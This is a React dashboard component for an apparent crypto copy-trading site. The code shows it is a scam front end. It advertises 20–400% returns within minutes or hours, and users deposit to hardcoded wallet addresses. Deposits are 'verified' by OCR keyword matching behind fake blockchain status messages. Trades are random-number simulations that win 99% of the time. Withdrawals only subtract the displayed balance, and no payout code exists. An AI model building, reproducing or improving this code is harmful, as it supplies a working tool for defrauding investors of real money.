import React, { useState, useRef, useEffect } from 'react';
import { useAuth } from '../contexts/AuthContext';
import TacticalGuide from './TacticalGuide';
import { Trader, Strategy } from '../types';
import { collection, query, orderBy, onSnapshot } from 'firebase/firestore';
import { db } from '../firebase.config';

interface DashboardProps {
  onSwitchTrader: () => void;
}


const PROFIT_STRATEGIES = [
  { id: '1', name: 'Instant Copy Plan', tag: 'Limited Slots', hook: 'Copy winning traders instantly', duration: '30 Seconds', durationMs: 30000, minRet: 20, maxRet: 25, risk: 'Secure', minInvest: 500, vip: false, order: 1, isActive: true },
  { id: '2', name: 'Auto-Profit Stream', tag: 'High Demand', hook: 'No experience needed — just copy profits', duration: '1 Minute', durationMs: 60000, minRet: 30, maxRet: 40, risk: 'Secure', minInvest: 1000, vip: false, order: 2, isActive: true },
  { id: '3', name: 'VIP Alpha Bridge', tag: 'Elite Access', hook: 'Follow top traders and earn automatically', duration: '5 Minutes', durationMs: 300000, minRet: 60, maxRet: 80, risk: 'Sovereign', minInvest: 2500, vip: true, order: 3, isActive: true },
  { id: '4', name: 'Pro-Market Core', tag: 'Global Flow', hook: 'Mirror expert trades in real time', duration: '1 Hour', durationMs: 3600000, minRet: 120, maxRet: 150, risk: 'Sovereign', minInvest: 5000, vip: true, order: 4, isActive: true },
  { id: '5', name: 'Whale Wealth Path', tag: 'Whale Only', hook: 'Let professionals trade for you', duration: '4 Hours', durationMs: 14400000, minRet: 300, maxRet: 400, risk: 'Whale Tier', minInvest: 10000, vip: true, order: 5, isActive: true },
] as Strategy[];

const NETWORKS = [
  { id: 'trc20', name: 'USDT (TRC-20)', address: 'TLY2M8F7p27z97E98979F25302979F25302' },
  { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' }
];

interface ActiveTrade {
  tradeId: string;
  plan: Strategy;
  investAmount: number;
  startTime: number;
  currentPnL: number;
  progress: number;
}

import Tesseract from 'tesseract.js';

const verifyPaymentProof = async (base64Image: string, mimeType: string) => {
  try {
    // 1. OCR Scanning
    const { data: { text } } = await Tesseract.recognize(
      `data:${mimeType};base64,${base64Image}`,
      'eng',
      { logger: m => console.log(m) }
    );

    const cleanText = text.toLowerCase();
    console.log("OCR Result:", cleanText);

    // 2. Keyword Validation (Status)
    const successKeywords = ['success', 'completed', 'confirmed', 'successful', 'sent'];
    const hasSuccess = successKeywords.some(keyword => cleanText.includes(keyword));

    if (!hasSuccess) {
      return {
        is_valid: false,
        detected_amount: 0,
        summary: "Validation Failed: No 'Success' or 'Completed' status found in receipt."
      };
    }

    // 3. Transaction Hash Validation (EVM 0x... or Tron T...)
    // Regex looks for 0x followed by 64 hex chars OR T followed by 33 alphanumeric chars
    const txHashRegex = /(0x[a-f0-9]{64}|T[a-zA-Z0-9]{33})/;
    const hasTxHash = txHashRegex.test(text); // Case sensitive check for Trust/Tron addresses

    if (!hasTxHash) {
      // Fallback: simple check for long strings that look like hashes if regex is too strict
      const simpleHashCheck = cleanText.includes('hash') || cleanText.includes('txid') || cleanText.includes('transaction id');
      if (!simpleHashCheck) {
        return {
          is_valid: false,
          detected_amount: 0,
          summary: "Validation Failed: No valid Transaction Hash detected."
        };
      }
    }

    // 4. Amount Extraction
    // Look for numbers following $, USDT, Amount, etc.
    // This is a basic extractor, can be improved
    const amountRegex = /(\$|usdt)\s?([0-9,]+(\.[0-9]{2})?)/i;
    const amountMatch = cleanText.match(amountRegex);

    let detectedAmount = 0;
    if (amountMatch && amountMatch[2]) {
      detectedAmount = parseFloat(amountMatch[2].replace(/,/g, ''));
    }

    return {
      is_valid: true,
      detected_amount: detectedAmount > 0 ? detectedAmount : 0,
      summary: detectedAmount > 0
        ? `Verified: $${detectedAmount} Transfer Confirmed.`
        : "Verified: Transaction Valid (Amount check manual)."
    };

  } catch (err) {
    console.error("OCR Error:", err);
    return {
      is_valid: false,
      detected_amount: 0,
      summary: "Error: Could not read image. Please upload a clearer screenshot."
    };
  }
};

const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
  const { userProfile: user, updateUser } = useAuth();
  const [strategies, setStrategies] = useState<Strategy[]>(PROFIT_STRATEGIES);
  const [selectedPlanId, setSelectedPlanId] = useState<string | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(500);
  const [isProcessingTrade, setIsProcessingTrade] = useState(false);
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [tradeResult, setTradeResult] = useState<{ status: 'WIN' | 'LOSS', amount: number } | null>(null);
  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
  const [withdrawStep, setWithdrawStep] = useState<'input' | 'confirm' | 'success'>('input');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawError, setWithdrawError] = useState('');

  const finishTrade = async (trade: ActiveTrade) => {
    const isWin = Math.random() <= 0.99;
    if (!user) return;

    if (isWin) {
      const profit = trade.investAmount * ((trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100);
      await updateUser({
        balance: user.balance + trade.investAmount + profit,
        totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
        wins: user.wins + 1
      });
      setTradeResult({ status: 'WIN', amount: profit });
    } else {
      await updateUser({
        totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
        losses: user.losses + 1
      });
      setTradeResult({ status: 'LOSS', amount: trade.investAmount });
    }
    setTimeout(() => setTradeResult(null), 5000);
  };

  const depositSectionRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [depositNetwork] = useState(NETWORKS[0]);
  const [isVerifyingReceipt, setIsVerifyingReceipt] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [verificationError, setVerificationError] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const tradeProfit = Math.max(0, (user?.balance || 0) - 1000);

  // Fetch Strategies
  useEffect(() => {
    const q = query(collection(db, 'strategies'), orderBy('order', 'asc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      if (!snapshot.empty) {
        const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as Strategy));
        setStrategies(data.filter(s => s.isActive));
      }
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (activeTrades.length === 0) return;

    const interval = setInterval(() => {
      const now = Date.now();

      setActiveTrades(currentTrades => {
        const updated = currentTrades.map(trade => {
          const elapsed = now - trade.startTime;
          const rawProgress = (elapsed / trade.plan.durationMs) * 100;

          if (rawProgress >= 100 && trade.progress < 100) {
            finishTrade(trade);
            return { ...trade, progress: 100 };
          }

          const roi = (trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100;
          const currentPnL = trade.investAmount * roi * (Math.min(100, rawProgress) / 100);

          return {
            ...trade,
            progress: Math.min(100, rawProgress),
            currentPnL
          };
        });
        return updated.filter(t => t.progress < 100);
      });
    }, 100);

    return () => clearInterval(interval);
  }, [activeTrades]);

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setIsVerifyingReceipt(true);
    setVerificationStatus('Initializing Node Handshake...');
    setVerificationError('');

    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64 = (reader.result as string).split(',')[1];
      setVerificationStatus('Authenticating Ledger...');
      await new Promise(r => setTimeout(r, 1500));
      setVerificationStatus('Syncing Blockchain Nodes...');
      const result = await verifyPaymentProof(base64, file.type);

      if (result.is_valid && result.detected_amount > 0) {
        setVerificationStatus(`VERIFIED: $${result.detected_amount}`);
        setTimeout(async () => {
          if (user) {
            await updateUser({
              balance: user.balance + result.detected_amount,
              hasDeposited: true
            });
            setIsVerifyingReceipt(false);
          }
        }, 1500);
      } else {
        setVerificationStatus('PROTOCOL REJECTED');
        setVerificationError(result.summary || 'Receipt Analysis Failed.');
        setTimeout(() => setIsVerifyingReceipt(false), 5000);
      }
    };
    reader.readAsDataURL(file);
  };

  const validateWithdrawal = () => {
    setWithdrawError('');
    const amount = Number(withdrawAmount);
    if (!amount || amount < 100) {
      setWithdrawError("Min Withdrawal: $100");
      return;
    }
    if (amount > (user?.balance || 0)) {
      setWithdrawError("Insufficient Liquidity");
      return;
    }
    if (!withdrawAddress || withdrawAddress.length < 15) {
      setWithdrawError("Invalid Wallet Target");
      return;
    }
    if (!user?.hasDeposited) {
      setWithdrawError("Node Inactive. Deposit to Activate Payouts.");
      return;
    }
    setWithdrawStep('confirm');
  };

  const confirmWithdrawal = () => {
    setIsWithdrawing(true);
    const amountToDeduct = Number(withdrawAmount);
    setTimeout(async () => {
      if (user) {
        await updateUser({ balance: user.balance - amountToDeduct });
        setIsWithdrawing(false);
        setWithdrawStep('success');
      }
    }, 3000);
  };

  const startDeployment = () => {
    const plan = strategies.find(p => p.id === selectedPlanId);
    if (!plan) return;
    if (!user || user.balance < investAmount) {
      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      alert("INSUFFICIENT_FUNDS: Please deposit to initialize strategy.");
      return;
    }
    setIsProcessingTrade(true);
    setTradeResult(null);
    setTimeout(() => {
      setIsProcessingTrade(false);
      setShowSuccessToast(true);
      if (user) executeTradeLogic(plan);
      setTimeout(() => {
        setShowSuccessToast(false);
        setSelectedPlanId(null);
      }, 2000);
    }, 4000);
  };

  const executeTradeLogic = async (plan: Strategy) => {
    if (!user) return;
    await updateUser({
      balance: user.balance - investAmount,
      totalInvested: user.totalInvested + investAmount
    });
    const newTrade: ActiveTrade = {
      tradeId: Math.random().toString(36).substr(2, 9),
      plan,
      investAmount,
      startTime: Date.now(),
      currentPnL: 0,
      progress: 0
    };
    setActiveTrades(prev => [...prev, newTrade]);
  };


  return (
    <div className="bg-[#131722] min-h-screen pt-4 pb-32 px-4 sm:px-6 lg:px-8 relative selection:bg-[#f01a64]/10">
      {(!user) && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-[#131722] text-white">
          Loading Account Data...
        </div>
      )}

      {isProcessingTrade && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-xl">
          <div className="flex flex-col items-center gap-6">
            <div className="relative w-20 h-20">
              <div className="absolute inset-0 border-4 border-white/5 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-[#f01a64] rounded-full animate-spin"></div>
            </div>
            <p className="text-white font-black uppercase tracking-[0.4em] text-[10px] animate-pulse">Routing Orders to Exchange...</p>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-8 py-4 rounded-2xl shadow-2xl animate-in slide-in-from-top-4">
          <span className="font-black uppercase tracking-widest text-xs">Mirror Protocol Engaged</span>
        </div>
      )}

      <TacticalGuide
        step={activeTrades.length > 0 ? 'investing' : 'ready'}
        balance={user?.balance || 0}
        hasDeposited={user?.hasDeposited || false}
        onDepositClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}
      />

      <div className="max-w-7xl mx-auto space-y-8">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl group hover:border-[#f01a64]/30 transition-colors">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Account Balance</span>
            <span className={`text-2xl font-black ${user?.hasDeposited ? 'text-[#00b36b]' : 'text-amber-500'}`}>${(user?.balance || 0).toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Money in Trade</span>
            <span className="text-2xl font-black text-white">${(user?.totalInvested || 0).toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Global Profits</span>
            <span className="text-2xl font-black text-[#00b36b]">+${tradeProfit.toLocaleString()}</span>
          </div>
          <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="bg-[#f01a64] p-6 rounded-3xl flex items-center justify-between shadow-xl active:scale-95 transition-all">
            <span className="text-sm font-black text-white uppercase italic">Add Funds</span>
            <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M13 7l5 5m0 0l-5 5m5-5H6" strokeWidth={2.5} /></svg>
          </button>
        </div>

        {activeTrades.length > 0 && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {activeTrades.map((trade) => (
              <div key={trade.tradeId} className="bg-[#1e222d] border border-[#f01a64]/40 p-6 rounded-[2rem] shadow-2xl overflow-hidden relative">
                <div className="absolute top-0 right-0 p-4 opacity-5">
                  <div className="w-12 h-12 bg-white rounded-full animate-ping"></div>
                </div>
                <div className="flex justify-between items-center mb-6">
                  <div>
                    <h4 className="text-white font-black uppercase text-xs tracking-widest mb-1">{trade.plan.name}</h4>
                    <span className="text-[8px] text-gray-500 font-black uppercase">Mirroring Expert Node</span>
                  </div>
                  <div className="text-right">
                    <span className="text-xl font-black font-mono text-[#00b36b]">
                      +${trade.currentPnL.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                </div>
                <div className="w-full h-1.5 bg-black/40 rounded-full overflow-hidden">
                  <div className="h-full bg-[#f01a64] transition-all duration-300" style={{ width: `${trade.progress}%` }}></div>
                </div>
                <div className="mt-3 flex justify-between items-center">
                  <span className="text-[8px] text-gray-600 font-black uppercase tracking-widest">Execution in Progress...</span>
                  <span className="text-[9px] text-[#00b36b] font-black">{Math.floor(trade.progress)}%</span>
                </div>
              </div>
            ))}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <h3 className="text-xl font-black text-white uppercase italic px-2">Choose Your Trade</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {strategies.map(plan => (
                <div key={plan.id} onClick={() => setSelectedPlanId(plan.id!)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] cursor-pointer transition-all hover:bg-[#2a2e39] ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
                  <h4 className="text-white font-black text-lg uppercase mb-1">{plan.name}</h4>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
                  <div className="flex justify-between items-end">
                    <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
                    <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
                  </div>
                  {selectedPlanId === plan.id && (
                    <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
                      <div className="flex gap-3">
                        <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
                        <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Deploy</button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-6">
            <div ref={depositSectionRef} className="bg-[#1e222d] border border-white/5 rounded-[3rem] p-8 shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase mb-6 italic">Secure Wallet Handshake</h3>
              <div className="bg-black/60 p-6 rounded-[2rem] border border-[#f01a64]/20 mb-8 text-center space-y-4">
                <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Network: {depositNetwork.name}</span>
                <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositNetwork.address}</div>
                <button onClick={() => { navigator.clipboard.writeText(depositNetwork.address); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
                  {copySuccess ? 'ADDRESS COPIED' : 'Copy Wallet Address'}
                </button>
              </div>
              <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
              <button onClick={() => fileInputRef.current?.click()} disabled={isVerifyingReceipt} className="w-full py-5 bg-[#f01a64] text-white rounded-2xl font-black uppercase tracking-[0.2em] text-[11px] disabled:opacity-50 shadow-xl transition-all active:scale-95">
                {isVerifyingReceipt ? (
                  <div className="flex items-center justify-center gap-3">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    <span>{verificationStatus}</span>
                  </div>
                ) : 'Confirm Transaction'}
              </button>
              {verificationError && <p className="text-red-500 text-[10px] font-black mt-3 text-center uppercase tracking-tighter">{verificationError}</p>}
            </div>

            <div className="bg-[#1e222d] border border-white/5 p-8 rounded-[3rem] shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase text-center mb-8 italic">Profit Withdrawal</h3>
              {withdrawStep === 'input' && (
                <div className="space-y-4">
                  <input type="text" placeholder="Withdrawal Address (TRC20)" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700" />
                  <input type="number" placeholder="USDT Amount" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700" />
                  {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
                  <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all">Request Payout</button>
                </div>
              )}
              {withdrawStep === 'confirm' && (
                <div className="space-y-6 text-center">
                  <p className="text-white font-black text-xl italic">${withdrawAmount}</p>
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest break-all px-4">{withdrawAddress}</p>
                  <div className="flex gap-3">
                    <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
                    <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95">
                      {isWithdrawing ? 'Processing...' : 'Confirm'}
                    </button>
                  </div>
                </div>
              )}
              {withdrawStep === 'success' && (
                <div className="text-center space-y-6 animate-in zoom-in-95">
                  <div className="w-16 h-16 bg-[#00b36b]/20 border border-[#00b36b]/40 rounded-full flex items-center justify-center mx-auto text-[#00b36b]">
                    <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                  </div>
                  <p className="text-white font-black text-xs uppercase tracking-widest">Payout Queued for Node {user?.nodeId}</p>
                  <button onClick={() => setWithdrawStep('input')} className="w-full py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase transition-all active:scale-95">Close Terminal</button>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;